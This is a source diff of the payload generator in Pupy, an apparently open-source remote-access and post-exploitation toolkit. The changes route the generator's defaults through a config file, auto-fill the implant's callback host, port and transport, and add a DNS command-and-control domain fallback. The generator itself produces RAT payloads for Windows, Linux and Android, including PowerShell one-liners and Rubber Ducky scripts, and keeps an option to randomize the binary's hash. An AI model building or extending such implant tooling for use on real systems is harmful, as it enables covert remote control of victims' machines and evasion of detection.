@@ -4,12 +4,13 @@
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
 import logging, argparse, sys, os.path, re, shlex, random, string, zipfile, tarfile, tempfile, shutil, subprocess, traceback, pkgutil
-from pupylib.utils.network import get_local_ip
+from pupylib.utils.network import get_listener_ip, get_listener_port
 from pupylib.utils.term import colorize
 from pupylib.payloads.python_packer import gen_package_pickled_dic
 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
 from pupylib.payloads.rubber_ducky import rubber_ducky
 from pupylib.utils.obfuscate import compress_encode_obfs
+from pupylib.PupyConfig import PupyConfig
 from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
@@ -207,8 +208,8 @@ def get_edit_apk(path, conf):
         shutil.rmtree(tempdir, ignore_errors=True)
         os.unlink(tempapk)
 
-def generate_binary_from_template(config, osname, arch=None, shared=False, debug=False, bits=None):
-    TEMPLATE_FMT = 'pupy{arch}{debug}.{ext}'
+def generate_binary_from_template(config, osname, arch=None, shared=False, debug=False, bits=None, fmt=None):
+    TEMPLATE_FMT = fmt or 'pupy{arch}{debug}.{ext}'
     ARCH_CONVERT = {
         'amd64': 'x64', 'x86_64': 'x64',
         'i386': 'x86', 'i486': 'x86', 'i586': 'x86', 'i686': 'x86',
@@ -346,19 +347,21 @@ PAYLOAD_FORMATS = [
 CLIENT_OS = [ 'android', 'windows', 'linux' ]
 CLIENT_ARCH = [ 'x86', 'x64' ]
 
-def get_parser(base_parser, default_arch='x86', default_os='windows', default_format='client'):
+def get_parser(base_parser, config):
     parser = base_parser(description='Generate payloads for windows, linux, osx and android.')
-    parser.add_argument('-f', '--format', default=default_format, choices=PAYLOAD_FORMATS, help="(default: client)")
-    parser.add_argument('-O', '--os', default=default_os, choices=CLIENT_OS, help='Target OS (default: windows)')
-    parser.add_argument('-A', '--arch', default=default_arch, choices=CLIENT_ARCH, help='Target arch (default: x86)')
+    parser.add_argument('-f', '--format', default=config.get('gen', 'format'),
+                            choices=PAYLOAD_FORMATS, help="(default: client)")
+    parser.add_argument('-O', '--os', default=config.get('gen', 'os'),
+                            choices=CLIENT_OS, help='Target OS (default: windows)')
+    parser.add_argument('-A', '--arch', default=config.get('gen', 'arch'),
+                            choices=CLIENT_ARCH, help='Target arch (default: x86)')
     parser.add_argument('-S', '--shared', default=False, action='store_true', help='Create shared object')
     parser.add_argument('-o', '--output', help="output path")
-    parser.add_argument('-D', '--output-dir', default='', help="output folder")
-    parser.add_argument('-P', '--default-port', default=443, type=int, help="default port")
+    parser.add_argument('-D', '--output-dir', default=config.get('gen', 'output'), help="output folder")
     parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
     parser.add_argument('-l', '--list', action=ListOptions, nargs=0, help="list available formats, transports, scriptlets and options")
-    parser.add_argument('-i', '--interface', default=None, help="The default interface to listen on")
-    parser.add_argument('-E', '--prefer-external', action='store_true', help="In case of autodetection prefer external IP")
+    parser.add_argument('-E', '--prefer-external', default=config.get('gen', 'external'),
+                            action='store_true', help="In case of autodetection prefer external IP")
     parser.add_argument('--no-use-proxy', action='store_true', help="Don't use the target's proxy configuration even if it is used by target (for ps1_oneliner only for now)")
     parser.add_argument('--ps1-oneliner-listen-port', default=8080, type=int, help="Port used by ps1_oneliner listener (default: %(default)s)")
     parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
@@ -368,14 +371,16 @@ def get_parser(base_parser, default_arch='x86', default_os='windows', default_fo
     parser.add_argument(
         'launcher', choices=[
             x for x in launchers.iterkeys()
-        ], default='connect', nargs='?',
+        ], default=config.get('gen', 'launcher') or 'connect', nargs='?',
         help="Choose a launcher. Launchers make payloads behave differently at startup."
     )
-    parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher options")
+    parser.add_argument(
+        'launcher_args', default=config.get('gen', 'launcher_args'),
+        nargs=argparse.REMAINDER, help="launcher options")
 
     return parser
 
-def pupygen(args):
+def pupygen(args, config):
     ok = colorize("[+] ","green")
 
     if args.workdir:
@@ -386,22 +391,36 @@ def pupygen(args):
         script_code=parse_scriptlets(args.scriptlet, debug=args.debug_scriptlets)
 
 
-    l=launchers[args.launcher]()
+    l = launchers[args.launcher]()
     while True:
         try:
-            print "LAUNCHER ARGS: {}".format(args.launcher_args)
             l.parse_args(args.launcher_args)
         except LauncherError as e:
             if str(e).strip().endswith("--host is required") and not "--host" in args.launcher_args:
-                myip=get_local_ip(args.interface, external=args.prefer_external)
+                myip = get_listener_ip(external=args.prefer_external, config=config)
                 if not myip:
                     raise ValueError("--host parameter missing and couldn't find your local IP. "
                                          "You must precise an ip or a fqdn manually")
+                myport = get_listener_port(config, external=args.prefer_external)
 
                 print(colorize("[!] required argument missing, automatically adding parameter "
-                                   "--host %s:443 from local or external ip address"%myip,"grey"))
-                args.launcher_args.insert(0,"%s:%d"%(myip, args.default_port))
-                args.launcher_args.insert(0,"--host")
+                                   "--host {}:{} from local or external ip address".format(myip, myport),"grey"))
+                args.launcher_args = [
+                    '--host', '{}:{}'.format(myip, myport), '-t', config.get('pupyd', 'transport')
+                ]
+            elif str(e).strip().endswith('--domain is required') and not '--domain' in args.launcher_args:
+                domain = config.get('pupyd', 'dnscnc').split(':')[0]
+                if not domain or '.' not in domain:
+                    print(colorize('[!] DNSCNC disabled!', 'red'))
+                    return
+
+                print(colorize("[!] required argument missing, automatically adding parameter "
+                                   "--domain {} from configuration file".format(domain),"grey"))
+
+                args.launcher_args = [
+                    '--domain', domain
+                ]
+
             else:
                 l.arg_parser.print_usage()
                 return
@@ -506,8 +525,10 @@ def pupygen(args):
 
 if __name__ == '__main__':
     Credentials.DEFAULT_ROLE = 'CLIENT'
-    parser = get_parser(argparse.ArgumentParser)
+    config = PupyConfig()
+    parser = get_parser(argparse.ArgumentParser, config)
     try:
-        pupygen(parser.parse_args())
+        pupygen(parser.parse_args(), config)
     except Exception, e:
+        logging.exception(e)
         sys.exit(str(e))
